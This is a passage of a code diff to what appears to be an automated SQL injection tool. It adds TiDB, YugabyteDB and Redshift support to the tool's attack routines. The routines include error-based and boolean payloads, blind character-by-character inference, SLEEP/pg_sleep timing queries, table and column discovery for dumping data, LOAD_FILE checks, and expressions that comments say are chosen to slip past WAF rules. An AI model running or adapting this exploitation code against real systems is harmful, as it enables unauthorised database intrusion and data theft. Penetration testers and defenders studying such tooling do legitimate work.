             if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                 _hq = f"SELECT encode(({query})::bytea, {_quote('hex')})"
-            elif _dbms in ("MySQL", "MariaDB"):
+            elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-INFERENCE-HEX-TIDB FIX: TiDB is MySQL-wire-compatible; HEX() valid.
                 _hq = f"SELECT HEX(({query}))"
             elif _dbms in ("MSSQL", "Sybase"):
                 # BUG-HEX-MSSQL-QUERY-FIX: The original CAST(expr AS VARBINARY(MAX)) produced
@@ -58377,9 +58872,10 @@ class Scanner:
                 _hex_len = max_len * 2
 
             for pos in range(1, _hex_len + 1):
-                # MySQL/SQLite HEX() returns uppercase A-F (65-70)
+                # MySQL/SQLite/TiDB HEX() returns uppercase A-F (65-70)
                 # PostgreSQL encode() returns lowercase a-f (97-102)
-                if _dbms in ("MySQL", "MariaDB", "SQLite", "Oracle", "MSSQL", "Sybase"):
+                # BUG-INFERENCE-HEX-CASE-TIDB FIX: TiDB HEX() returns uppercase like MySQL.
+                if _dbms in ("MySQL", "MariaDB", "TiDB", "SQLite", "Oracle", "MSSQL", "Sybase"):
                     lo, hi = 48, 70   # '0'(48) to 'F'(70)  5 bisection steps
                 else:
                     lo, hi = 48, 102  # '0'(48) to 'f'(102)  6 bisection steps
@@ -58476,8 +58972,13 @@ class Scanner:
             _ERR_PAYLOADS = {
                 "PostgreSQL": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
                 "CockroachDB": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
+                # BUG-ERRPAYLOAD-YUGABYTE-REDSHIFT FIX: PG-compatible; :: cast syntax works.
+                "YugabyteDB": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
+                "Amazon Redshift": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
                 "MySQL": ("IF(1>0,1/0,1)", "IF(1>2,1/0,1)"),
                 "MariaDB": ("IF(1>0,1/0,1)", "IF(1>2,1/0,1)"),
+                # BUG-ERRPAYLOAD-TIDB-DIV FIX: TiDB is MySQL-compatible; IF() and 1/0 work.
+                "TiDB": ("IF(1>0,1/0,1)", "IF(1>2,1/0,1)"),
                 "MSSQL": ("1/CASE WHEN 1>0 THEN 0 ELSE 1 END", "1/CASE WHEN 1>2 THEN 0 ELSE 1 END"),
                 "Oracle": ("1/CASE WHEN 1>0 THEN 0 ELSE 1 END", "1/CASE WHEN 1>2 THEN 0 ELSE 1 END"),
                 "SQLite": ("CASE WHEN 1>0 THEN 1/0 ELSE 1 END", "CASE WHEN 1>2 THEN 1/0 ELSE 1 END"),
@@ -60355,6 +60856,13 @@ class Scanner:
             _INF_VQ = {
                 "PostgreSQL":  "SELECT version()",
                 "CockroachDB": "SELECT version()",
+                # BUG-INFVQ-TIDB FIX: TiDB has TIDB_VERSION() for full version string.
+                # version() works but returns MySQL-style string without TiDB details.
+                "TiDB":        "SELECT TIDB_VERSION()",
+                # BUG-INFVQ-YUGABYTE FIX: yb_server_version() is YugabyteDB-specific.
+                "YugabyteDB":  "SELECT yb_server_version()",
+                # BUG-INFVQ-REDSHIFT FIX: version() is valid for Redshift (PG-compat).
+                "Amazon Redshift": "SELECT version()",
                 "MySQL":       "SELECT VERSION()",
                 "MariaDB":     "SELECT VERSION()",
                 "MSSQL":       "SELECT @@VERSION",
@@ -60369,6 +60877,16 @@ class Scanner:
             _INF_DQ = {
                 "PostgreSQL":  "SELECT current_database()",
                 "CockroachDB": "SELECT current_database()",
+                # BUG-INFDQ-TIDB FIX: TiDB does NOT have current_database() (PG function).
+                # TiDB is MySQL-wire-compatible; use database() (MySQL syntax).
+                # Without this entry TiDB fell to the default "SELECT current_database()"
+                # which raises "Unknown column 'current_database' in 'field list'" on TiDB,
+                # causing all inference-path database-name extraction to return "" silently.
+                "TiDB":        "SELECT database()",
+                # BUG-INFDQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
+                "YugabyteDB":  "SELECT current_database()",
+                # BUG-INFDQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible.
+                "Amazon Redshift": "SELECT current_database()",
                 "MySQL":       "SELECT database()",
                 "MariaDB":     "SELECT database()",
                 "MSSQL":       "SELECT DB_NAME()",
@@ -60383,6 +60901,12 @@ class Scanner:
             _INF_UQ = {
                 "PostgreSQL":  "SELECT current_user",
                 "CockroachDB": "SELECT current_user",
+                # BUG-INFUQ-TIDB FIX: TiDB is MySQL-wire-compatible; use CURRENT_USER().
+                "TiDB":        "SELECT CURRENT_USER()",
+                # BUG-INFUQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; keyword form.
+                "YugabyteDB":  "SELECT current_user",
+                # BUG-INFUQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; keyword form.
+                "Amazon Redshift": "SELECT current_user",
                 "MySQL":       "SELECT CURRENT_USER()",
                 "MariaDB":     "SELECT CURRENT_USER()",
                 "MSSQL":       "SELECT SYSTEM_USER",
@@ -60471,7 +60995,7 @@ class Scanner:
                     # to the regex binary search fallback — both support PG's ~ operator.
                     if not _inf_results_bw and _dbms in ("PostgreSQL", "CockroachDB",
                                                           "YugabyteDB", "Amazon Redshift",
-                                                          "MySQL", "MariaDB"):
+                                                          "MySQL", "MariaDB", "TiDB"):  # BUG-REGEX-TIDB FIX: TiDB supports REGEXP like MySQL
                         LOG.info("[Inference] Standard extraction empty — trying regex binary search")
                         for _rlabel, _ralts in [("user", _pg_user_alts), ("database", _pg_db_alts)]:
                             for _rq in _ralts:
@@ -61618,10 +62142,22 @@ class Scanner:
                 Last resort: O(n) per char but impossible to block without
                 breaking basic SQL equality entirely."""
                 _ae = {
-                    "PostgreSQL":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "CockroachDB": f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
-                    "MySQL":       f"ORD(SUBSTRING(({q}),{p},1))",
-                    "MariaDB":     f"ORD(SUBSTRING(({q}),{p},1))",
+                    "PostgreSQL":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "CockroachDB":      f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    # BUG-FALLBACK-EQ-PGCOMPAT FIX: YugabyteDB and Amazon Redshift are
+                    # PG-wire-compatible; they use FROM/FOR SUBSTRING syntax and ASCII()
+                    # returns 0..U+10FFFF. Without explicit entries they fell to the generic
+                    # else: ASCII(SUBSTRING(q,p,1)) (comma syntax) which works but differs
+                    # from the canonical PG form and may fail on strict parser configurations.
+                    "YugabyteDB":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "Amazon Redshift":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
+                    "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
+                    # BUG-FALLBACK-EQ-TIDB FIX: TiDB is MySQL-wire-compatible; ORD() returns
+                    # 0..U+10FFFF for multi-byte UTF-8. Without explicit entry TiDB fell to
+                    # the generic else: ASCII(SUBSTRING(...)) which returns 0 for code points
+                    # > 127 — all chars above ASCII silently returned as wrong codepoints.
+                    "TiDB":             f"ORD(SUBSTRING(({q}),{p},1))",
                     # BUG-FALLBACK-EQ-MSSQL-UNICODE FIX (Req 10): UNICODE() for full range.
                     # BUG-FALLBACK-EQ-MSSQL-ISNULL FIX: UNICODE() returns NULL past string
                     # end. The equality oracle evaluates NULL=N as NULL (unknown), not False,
@@ -62512,17 +63048,26 @@ class Scanner:
                     LOG.warning("[Inference] Deferred oracle sanity probe failed (%s) — marking oracle fragile", _san_err)
 
         if _try_bitwise_deferred and not _oracle_fragile:
+            # BUG-VQDQUQ-TIDB-YUGABYTE-REDSHIFT FIX: TiDB/YugabyteDB/Amazon Redshift were
+            # absent from all three dicts. They fell to .get(_dbms, default) where the default
+            # may be a cross-DBMS generic expression that fails on these engines.
             _VQ = {"PostgreSQL":"SELECT version()","MySQL":"SELECT VERSION()","MSSQL":"SELECT @@VERSION",
                    "Oracle":"SELECT banner FROM v$version WHERE ROWNUM=1","SQLite":"SELECT sqlite_version()",
-                   "MariaDB":"SELECT VERSION()","CockroachDB":"SELECT version()","Sybase":"SELECT @@VERSION",
+                   "MariaDB":"SELECT VERSION()","TiDB":"SELECT TIDB_VERSION()","CockroachDB":"SELECT version()",
+                   "YugabyteDB":"SELECT yb_server_version()","Amazon Redshift":"SELECT version()",
+                   "Sybase":"SELECT @@VERSION",
                    "DB2":"SELECT SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())"}
             _DQ = {"PostgreSQL":"SELECT current_database()","MySQL":"SELECT database()","MSSQL":"SELECT DB_NAME()",
                    "Oracle":"SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual","SQLite":"SELECT 'main'",
-                   "MariaDB":"SELECT database()","CockroachDB":"SELECT current_database()","Sybase":"SELECT DB_NAME()",
+                   "MariaDB":"SELECT database()","TiDB":"SELECT database()","CockroachDB":"SELECT current_database()",
+                   "YugabyteDB":"SELECT current_database()","Amazon Redshift":"SELECT current_database()",
+                   "Sybase":"SELECT DB_NAME()",
                    "DB2":"SELECT CURRENT_SCHEMA FROM SYSIBM.SYSDUMMY1"}
             _UQ = {"PostgreSQL":"SELECT current_user","MySQL":"SELECT CURRENT_USER()","MSSQL":"SELECT SYSTEM_USER",
                    "Oracle":"SELECT USER FROM dual","SQLite":"SELECT 'admin'",
-                   "MariaDB":"SELECT CURRENT_USER()","CockroachDB":"SELECT current_user","Sybase":"SELECT SUSER_NAME()",
+                   "MariaDB":"SELECT CURRENT_USER()","TiDB":"SELECT CURRENT_USER()","CockroachDB":"SELECT current_user",
+                   "YugabyteDB":"SELECT current_user","Amazon Redshift":"SELECT current_user",
+                   "Sybase":"SELECT SUSER_NAME()",
                    "DB2":"SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1"}
             _aq = [("version", _VQ), ("database", _DQ), ("user", _UQ)]
             _ext = {}
@@ -62672,7 +63217,8 @@ class Scanner:
                     _post = _body[_npos + len(_num):]
                     if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                         _arith = f"([INFERENCE])::int*{_num}"
-                    elif _dbms in ("MySQL", "MariaDB"):
+                    elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-INFERENCE-REBUILD-ARITH-TIDB FIX: TiDB supports IF() like MySQL.
                         _arith = f"IF([INFERENCE],{_num},0)"
                     elif _dbms == "H2":
                         _arith = f"([INFERENCE])*{_num}"
@@ -62975,7 +63521,8 @@ class Scanner:
             the table name before embedding them in the SQL literal.
             """
             # DBMS-specific identifier quoting for column and table names.
-            if _dbms in ("MySQL", "MariaDB"):
+            if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-COLEXISTS-TIDB FIX: TiDB uses backtick quoting like MySQL.
                 _col_q = f"`{column}`"
                 _tbl_q = f"`{table}`"
             elif _dbms in ("MSSQL", "Sybase"):
@@ -63007,7 +63554,8 @@ class Scanner:
             # Non-existent columns still trigger a SQL reference error → oracle returns
             # None → caller's `if _exists:` is False.  Quoted reserved-word identifiers
             # (applied above) ensure only truly absent columns cause the SQL error.
-            if _dbms in ("MySQL", "MariaDB"):
+            if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-COLEXISTS-NULL-TIDB FIX: TiDB supports CAST AS CHAR and COALESCE.
                 _null_safe_cq = _limit1(f"SELECT COALESCE(CAST({_col_q} AS CHAR),'') FROM {_tbl_q}")
             elif _dbms in ("MSSQL", "Sybase"):
                 _null_safe_cq = _limit1(f"SELECT COALESCE(CAST({_col_q} AS NVARCHAR(MAX)),'') FROM {_tbl_q}")
@@ -63045,7 +63593,8 @@ class Scanner:
             Fix: apply DBMS-specific identifier quoting consistently in both places.
             """
             # DBMS-specific quoting for the table identifier
-            if _dbms in ("MySQL", "MariaDB"):
+            if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-ROWCOUNT-TIDB FIX: TiDB uses backtick quoting like MySQL.
                 _tbl_q = f"`{table}`"
             elif _dbms in ("MSSQL", "Sybase"):
                 _tbl_q = f"[{table}]"
@@ -63081,7 +63630,9 @@ class Scanner:
 
         _DB_QUERY = {
             "PostgreSQL": "SELECT current_catalog", "CockroachDB": "SELECT current_catalog",
+            "YugabyteDB": "SELECT current_catalog", "Amazon Redshift": "SELECT current_catalog",
             "MySQL": "SELECT database()", "MariaDB": "SELECT database()",
+            "TiDB": "SELECT database()",  # BUG-DBQUERY-TIDB FIX
             "MSSQL": "SELECT db_name()", "Sybase": "SELECT db_name()",
             # BUG-ORA-INFDB-FIX: ora_database_name is a PL/SQL trigger-only attribute,
             # not a SQL function — raises ORA-00904 in any DML SELECT statement.
@@ -63098,7 +63649,9 @@ class Scanner:
         }
         _USER_QUERY = {
             "PostgreSQL": "SELECT current_user", "CockroachDB": "SELECT current_user",
+            "YugabyteDB": "SELECT current_user", "Amazon Redshift": "SELECT current_user",
             "MySQL": "SELECT current_user()", "MariaDB": "SELECT current_user()",
+            "TiDB": "SELECT current_user()",  # BUG-USERQUERY-TIDB FIX
             "MSSQL": "SELECT system_user", "Sybase": "SELECT suser_name()",
             "Oracle": "SELECT user FROM dual", "SQLite": "SELECT " + _quote("sqlite"),
             "DB2": "SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1",
@@ -63108,7 +63661,9 @@ class Scanner:
         }
         _VER_QUERY = {
             "PostgreSQL": "SELECT version()", "CockroachDB": "SELECT version()",
+            "YugabyteDB": "SELECT version()", "Amazon Redshift": "SELECT version()",
             "MySQL": "SELECT version()", "MariaDB": "SELECT version()",
+            "TiDB": "SELECT version()",  # BUG-VERQUERY-TIDB FIX
             # BUG-EXT-R10-A FIX: MSSQL @@VERSION returns a text type; using it bare or with
             # CAST/CONVERT without VARCHAR(MAX) silently truncates to 8000 chars on older
             # SQL Server versions. CONVERT(VARCHAR(MAX),...) has no length limit.
@@ -63338,11 +63893,9 @@ class Scanner:
                           f"WHERE table_name={_quote(table)} "
                           f"AND table_schema=current_schema() "
                           f"ORDER BY ordinal_position")
-            elif _dbms in ("MySQL", "MariaDB"):
-                # BUG-DISCOVER-COLUMNS-NO-SCHEMA-FILTER FIX: same missing schema filter.
-                # MySQL: database() returns the currently selected schema. The original
-                # query without this filter returned columns from every schema that has
-                # a table with the given name (e.g. information_schema, mysql, app_db).
+            elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-INFERENCE-DISCCOLS-TIDB FIX: TiDB is MySQL-wire-compatible; uses
+                # information_schema.columns with database() as schema filter like MySQL.
                 _col_q = (f"SELECT column_name FROM information_schema.columns "
                           f"WHERE table_name={_quote(table)} "
                           f"AND table_schema=database() "
@@ -63590,6 +64143,13 @@ class Scanner:
                 "Amazon Redshift": "SELECT tablename FROM pg_tables WHERE schemaname=current_schema()",
                 "MySQL": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
                 "MariaDB": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
+                # BUG-DISCOVER-TABLES-TIDB FIX: TiDB is MySQL-wire-compatible; use database()
+                # to scope the table list to the current database, identical to MySQL/MariaDB.
+                # Without this entry TiDB fell to the generic fallback which has no WHERE filter,
+                # returning tables from ALL schemas (information_schema, performance_schema, mysql,
+                # test, etc.) interleaved with application tables — inflating the table list and
+                # breaking downstream dump calls that expected application-schema table names.
+                "TiDB": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE'",
                 # BUG-MSSQL-DISCOVER-TABLES-SCHEMA-UNFILTERED FIX: The previous entry had
                 # no schema filter — information_schema.tables without a schema predicate
                 # returns ALL user tables across every schema in the database (dbo, sales,
@@ -63683,14 +64243,11 @@ class Scanner:
                         f"'APEX_040200','APEX_030200') ORDER BY owner, table_name) _t1"
                         f") _t2 WHERE r={i+1}"
                     )
-                elif _dbms in ("MySQL", "MariaDB"):
-                    # BUG-DISCOVER-TABLES-NO-ORDER FIX: MySQL/MariaDB LIMIT N OFFSET M
-                    # without ORDER BY returns rows in non-deterministic heap order —
-                    # identical to BUG-MYSQL-ERROR-TABLES-NO-ORDER fixed in _error_enum_tables
-                    # but previously missed in this _discover_tables inference path.
-                    # Different LIMIT OFFSET calls can return the same table or skip tables
-                    # when autovacuum or concurrent writes reorder the storage.
-                    # Fix: add ORDER BY table_name for deterministic alphabetic pagination.
+                elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-INFERENCE-DISCTABLES-TIDB FIX: TiDB is MySQL-wire-compatible;
+                    # uses information_schema.tables with LIMIT/OFFSET and ORDER BY.
+                    # BUG-DISCOVER-TABLES-NO-ORDER FIX: MySQL/MariaDB/TiDB LIMIT N OFFSET M
+                    # without ORDER BY returns rows in non-deterministic heap order.
                     _iq = f"{_tq} ORDER BY table_name LIMIT 1 OFFSET {i}"
                 # BUG-DISCOVER-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
                 # Redshift — both support pg_tables + current_schema() + LIMIT/OFFSET.
@@ -63967,7 +64524,8 @@ class Scanner:
                     # word) as a candidate — without this fix that probe ALWAYS failed.
                     # Fix: apply the same DBMS-specific quoting used in _error_dump_table,
                     # _error_enum_tables, _get_row_count, and _discover_tables.
-                    if _dbms in ("MySQL", "MariaDB"):
+                    if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-INF-DUMP-TIDB FIX: TiDB uses backtick quoting like MySQL.
                         _col_q_inf = f"`{_cn}`"
                         _tbl_q_inf = f"`{_tbl}`"
                     elif _dbms in ("MSSQL", "Sybase"):
@@ -65441,6 +65999,14 @@ class Scanner:
         _db_exprs = {
             "PostgreSQL":  "current_catalog",   # No 'database' in name → WAF bypass
             "CockroachDB": "current_catalog",
+            # BUG-DIRECTEXPR-DBTIDB FIX: TiDB is MySQL-wire-compatible; current_catalog
+            # is a PG function not available in TiDB → SQL error → empty result.
+            # TiDB uses database() (MySQL syntax) to return the current schema name.
+            "TiDB":        "database()",
+            # BUG-DIRECTEXPR-DBYUGABYTE FIX: YugabyteDB is PG-wire-compatible; current_catalog works.
+            "YugabyteDB":  "current_catalog",
+            # BUG-DIRECTEXPR-DBREDSHIFT FIX: Amazon Redshift is PG-wire-compatible; current_catalog works.
+            "Amazon Redshift": "current_catalog",
             "MySQL":       "database()",
             "MariaDB":     "database()",
             "MSSQL":       "db_name()",
@@ -65483,6 +66049,14 @@ class Scanner:
             # → bypasses WAF rules targeting 'user'/'current_user'/'session_user' identifiers
             "PostgreSQL":  "current_role",
             "CockroachDB": "current_role",
+            # BUG-DIRECTEXPR-USERTIDB FIX: TiDB is MySQL-wire-compatible; current_role
+            # is a PG function not available in TiDB → SQL error → empty result.
+            # TiDB uses current_user() (MySQL function call syntax).
+            "TiDB":        "current_user()",
+            # BUG-DIRECTEXPR-USERYUGABYTE FIX: YugabyteDB is PG-wire-compatible; current_role works.
+            "YugabyteDB":  "current_role",
+            # BUG-DIRECTEXPR-USERREDSHIFT FIX: Amazon Redshift is PG-wire-compatible; current_user works.
+            "Amazon Redshift": "current_user",
             "MySQL":       "current_user()",
             "MariaDB":     "current_user()",
             "MSSQL":       "system_user",
@@ -65529,7 +66103,8 @@ class Scanner:
                 # cause SQL syntax errors, making _extract_s silently return "" for any
                 # probe column or user-specified target table whose name is a reserved word.
                 # Fix: apply the same DBMS-specific quoting used throughout the pipeline.
-                if _dbms in ("MySQL", "MariaDB"):
+                if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-DIRECT-DUMP-TIDB FIX: TiDB uses backtick quoting like MySQL.
                     _col_q_de = f"`{_cn}`"
                     _tbl_q_de = f"`{_tbl}`"
                 elif _dbms in ("MSSQL", "Sybase"):
@@ -66181,8 +66756,10 @@ class Scanner:
                     # valid as a scalar subquery anywhere a value expression is expected.
                     _eo_version_q = (
                         "CAST(@@version AS VARCHAR(200))" if _eo_dbms == "MSSQL" else
-                        "@@version" if _eo_dbms in ("MySQL", "MariaDB") else
-                        "version()" if _eo_dbms == "PostgreSQL" else
+                        # BUG-EO-VERSION-TIDB FIX: TiDB uses @@version like MySQL.
+                        "@@version" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
+                        # BUG-EO-VERSION-CRDB FIX: CockroachDB/YugabyteDB/Redshift use version().
+                        "version()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else
                         # BUG-ORACLE-EXTRACT-4 FIX: wrap in scalar subquery parens
                         "(SELECT banner FROM v$version WHERE ROWNUM=1)" if _eo_dbms == "Oracle" else
                         "sqlite_version()"
@@ -66192,13 +66769,17 @@ class Scanner:
                     # ORA-06553 in pre-19c Oracle when used in a WHERE-clause injection
                     # context without a FROM clause.  The scalar subquery is universally valid.
                     _eo_user_q = (
-                        "user()" if _eo_dbms in ("MySQL", "MariaDB") else
-                        "current_user" if _eo_dbms in ("PostgreSQL", "MSSQL") else
+                        # BUG-EO-USER-TIDB FIX: TiDB uses user() like MySQL.
+                        "user()" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
+                        # BUG-EO-USER-CRDB FIX: CockroachDB/YugabyteDB/Redshift use current_user.
+                        "current_user" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MSSQL") else
                         "(SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL)" if _eo_dbms == "Oracle" else
                         "''")
                     _eo_db_q = (
-                        "database()" if _eo_dbms in ("MySQL", "MariaDB") else
-                        "current_database()" if _eo_dbms == "PostgreSQL" else
+                        # BUG-EO-DB-TIDB FIX: TiDB uses database() like MySQL.
+                        "database()" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
+                        # BUG-EO-DB-CRDB FIX: CockroachDB/YugabyteDB/Redshift use current_database().
+                        "current_database()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else
                         "db_name()" if _eo_dbms == "MSSQL" else
                         # BUG-ORACLE-EO-FALLBACK-DB-QUERY FIX: The previous query was
                         #   (SELECT name FROM v$database WHERE ROWNUM=1)
@@ -66522,7 +67103,8 @@ class Scanner:
                     # fired earlier did NOT use LOAD_FILE (meaning FILE privilege was never
                     # confirmed in this session), remove LOAD_FILE payloads from the list to
                     # avoid wasting HTTP requests. The detection payload is in enum.result.
-                    if _dbms in ("MySQL", "MariaDB"):
+                    if _dbms in ("MySQL", "MariaDB", "TiDB"):
+                        # BUG-OOB-FILE-PRIV-TIDB FIX: TiDB also requires FILE privilege for LOAD_FILE.
                         _oob_file_priv_confirmed = getattr(cfg, '_oob_has_file_priv', False)
                         if not _oob_file_priv_confirmed:
                             _det_pay_up = (getattr(getattr(enum, 'result', None), 'payload', '') or '').upper()
@@ -66713,9 +67295,12 @@ class Scanner:
             _v = ""
             _ver_queries = {
                 "MySQL": "SELECT VERSION()", "MariaDB": "SELECT VERSION()",
+                "TiDB": "SELECT VERSION()",              # BUG-VERQ-TIDB FIX
                 # BUG-EXT-R10-A FIX: CONVERT(VARCHAR(MAX),...) prevents silent truncation
                 "MSSQL": "SELECT CONVERT(VARCHAR(MAX),@@VERSION)", "Sybase": "SELECT @@VERSION",
                 "PostgreSQL": "SELECT version()", "CockroachDB": "SELECT version()",
+                "YugabyteDB": "SELECT version()",        # BUG-VERQ-YUGABYTE FIX
+                "Amazon Redshift": "SELECT version()",   # BUG-VERQ-REDSHIFT FIX
                 "Oracle": "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1",
                 "SQLite": "SELECT (SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
                 "DB2": "SELECT SERVICE_LEVEL FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY",
@@ -66747,7 +67332,10 @@ class Scanner:
             # Database
             _queries_db = {
                 "PostgreSQL": "current_catalog", "CockroachDB": "current_catalog",
+                "YugabyteDB": "current_catalog",   # BUG-SCE-DB-YUGABYTE FIX
+                "Amazon Redshift": "current_catalog",  # BUG-SCE-DB-REDSHIFT FIX
                 "MySQL": "database()", "MariaDB": "database()",
+                "TiDB": "database()",  # BUG-SCE-DB-TIDB FIX
                 "MSSQL": "db_name()", "Sybase": "db_name()",
                 # BUG-ORA-SIDEDB-FIX: ora_database_name is PL/SQL only → ORA-00904 in SQL.
                 "Oracle": "SYS_CONTEXT('USERENV','DB_NAME')",
@@ -66778,7 +67366,10 @@ class Scanner:
             # User
             _queries_user = {
                 "PostgreSQL": "current_user", "CockroachDB": "current_user",
+                "YugabyteDB": "current_user",   # BUG-SCE-USER-YUGABYTE FIX
+                "Amazon Redshift": "current_user",  # BUG-SCE-USER-REDSHIFT FIX
                 "MySQL": "current_user()", "MariaDB": "current_user()",
+                "TiDB": "current_user()",  # BUG-SCE-USER-TIDB FIX
                 "MSSQL": "system_user", "Sybase": "system_user",
                 "Oracle": "user",
                 # BUG-SCE-SQLITE-USER-FIX: was "(SELECT sqlite_version())" — SQLite has no
@@ -66992,6 +67583,14 @@ class Scanner:
                 _nofunc_exprs = {
                     "PostgreSQL":  {"version": "version()", "current_db": "current_catalog", "current_user": "current_user"},
                     "CockroachDB": {"version": "version()", "current_db": "current_catalog", "current_user": "current_user"},
+                    # BUG-NOFUNC-TIDB FIX: TiDB is MySQL-wire-compatible; @@version and TIDB_VERSION()
+                    # both work. Use TIDB_VERSION() for version as it returns TiDB-specific info.
+                    "TiDB":        {"version": "TIDB_VERSION()", "current_db": "database()", "current_user": "user()"},
+                    # BUG-NOFUNC-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
+                    "YugabyteDB":  {"version": "yb_server_version()", "current_db": "current_catalog", "current_user": "current_user"},
+                    # BUG-NOFUNC-REDSHIFT FIX: Amazon Redshift is PG-compatible; version() returns
+                    # the Redshift version string. CURRENT_USER is a keyword (not function) in Redshift.
+                    "Amazon Redshift": {"version": "version()", "current_db": "current_database()", "current_user": "current_user"},
                     "MySQL":       {"version": "@@version"},
                     "MariaDB":     {"version": "@@version"},
                     "MSSQL":       {"version": "CONVERT(VARCHAR(MAX),@@VERSION)",  "current_db": "DB_NAME()",    "current_user": "SYSTEM_USER"},
@@ -67077,7 +67676,9 @@ class Scanner:
                         # (Supabase, Hasura, Rails custom schemas, multi-tenant deploys).
                         # current_schema() resolves dynamically — same fix as _discover_tables.
                         _sys_where = "schemaname=current_schema()"
-                    elif (getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or "") in ("MySQL","MariaDB"):
+                    elif (getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or "") in ("MySQL","MariaDB","TiDB"):
+                        # BUG-MSE-FROMBASE-TIDB FIX: TiDB uses information_schema.tables
+                        # with database() as schema filter, identical to MySQL.
                         _sys_table = "information_schema.tables"
                         _sys_col = "table_name"
                         _sys_where = "table_schema=database()"
@@ -67111,7 +67712,9 @@ class Scanner:
                                             f"SELECT pg_sleep(({_sys_col}>={val})::int * {_t_s}) "
                                             f"FROM {_sys_table} WHERE {_sys_where} "
                                             f"LIMIT 1 OFFSET {_off}")
-                                    elif _mse.dbms in ("MySQL", "MariaDB"):
+                                    elif _mse.dbms in ("MySQL", "MariaDB", "TiDB"):
+                                        # BUG-MSE-FROMBASE-SLEEP-TIDB FIX: TiDB supports
+                                        # SLEEP() and LIMIT/OFFSET in stacked queries like MySQL.
                                         p = _mse._build_stacked(
                                             f"SELECT SLEEP(({_sys_col}>={val}) * {_t_s}) "
                                             f"FROM {_sys_table} WHERE {_sys_where} "
@@ -67149,7 +67752,9 @@ class Scanner:
                             # BUG-MSE-SUBQPATH-PG-PUBLIC-SCHEMA FIX: hardcoded schemaname=$$public$$
                             # returns 0 tables for non-public schemas.  current_schema() fix.
                             _tbl_base = "SELECT tablename FROM pg_tables WHERE schemaname=current_schema()"
-                        elif _edbms in ("MySQL","MariaDB"):
+                        elif _edbms in ("MySQL","MariaDB","TiDB"):
+                            # BUG-MSE-SUBQPATH-TIDB FIX: TiDB uses information_schema.tables
+                            # with database() schema filter, identical to MySQL.
                             _tbl_base = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
                         elif _edbms in ("MSSQL", "Sybase"):
                             _tbl_base = "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'"
@@ -67430,6 +68035,18 @@ class Scanner:
                             "MySQL":      {"version": "@@version"},
                             # BUG-EXT-R10-A FIX: use VARCHAR(MAX) for safe full-length extraction
                             "MSSQL":      {"version": "CONVERT(VARCHAR(MAX),@@VERSION)", "current_db": "DB_NAME()"},
+                            # BUG-DB-QUERIES-TIDB FIX: TiDB is MySQL-wire-compatible; @@version and
+                            # database() are valid. TIDB_VERSION() returns richer TiDB-specific info.
+                            "TiDB":       {"version": "TIDB_VERSION()", "current_db": "database()"},
+                            # BUG-DB-QUERIES-CRDB FIX: CockroachDB is PG-wire-compatible.
+                            # Prior fallback was MySQL @@version → syntax error on CockroachDB.
+                            "CockroachDB": {"current_db": "current_database()", "current_user": "current_user"},
+                            # BUG-DB-QUERIES-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
+                            "YugabyteDB":  {"current_db": "current_catalog", "current_user": "current_user"},
+                            # BUG-DB-QUERIES-REDSHIFT FIX: Amazon Redshift is PG-compatible.
+                            # Prior fallback was MySQL @@version → syntax error on Redshift.
+                            "Amazon Redshift": {"current_db": "current_database()", "current_user": "current_user"},
+                            "MariaDB":    {"version": "@@version", "current_db": "database()"},
                         }.get(getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or "MySQL", {})
                         for label, sql_expr in _db_queries.items():
                             val = await asyncio.wait_for(
